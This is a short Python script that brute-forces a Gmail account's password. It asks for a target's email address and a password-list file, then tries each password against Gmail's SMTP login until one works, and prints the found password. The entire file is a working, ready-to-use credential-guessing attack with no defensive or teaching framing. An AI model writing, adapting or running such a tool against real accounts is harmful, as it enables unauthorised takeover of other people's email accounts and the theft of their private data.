# Importing necessary libs
import smtplib
from termcolor import colored
import os

# Clearing the screen for new session
os.system('clear')

# Setting up host server
btf_server = smtplib.SMTP('smtp.gmail.com', 587)
btf_server.ehlo()
btf_server.starttls()

# Getting username snd password list from user.
emailaddrs = str(input(colored("[*] Enter Targets Email: ", 'yellow'))).__str__()
pwdlst = input(colored("[*] Enter Path to Password File: ", 'yellow')).__str__()

# Opening the Password list and Setting it to 'read mode'
opn_file = open(pwdlst, 'r')

# iterating over the password list to get the password
for password in opn_file:
    password = password.strip()
    try:
        btf_server.login(emailaddrs, password)
        print(colored('[+] Password Found: %s' % password, 'green'))
        break
    except smtplib.SMTPAuthenticationError:
        print(colored('[!] Wrong Password: {}'.format(password), 'red'))
